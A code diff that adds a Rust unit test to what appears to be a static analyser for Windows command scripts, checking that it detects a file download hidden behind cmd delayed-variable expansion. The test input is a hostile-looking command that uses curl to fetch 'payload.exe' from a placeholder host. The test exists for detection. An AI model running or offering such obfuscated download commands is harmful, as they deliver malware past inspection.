@@ -5754,6 +5754,30 @@ mod start_tests {
 }
 
 #[cfg(test)]
+mod call_wrapper_tests {
+    use crate::analyze;
+    use crate::env::Config;
+    use crate::traits::Trait;
+
+    #[test]
+    fn call_cmd_child_preserves_delayed_expansion() {
+        let script = br#"call cmd.exe /V:ON /c "set U=https://call-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://call-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "call cmd child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
 mod powershell_tests {
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
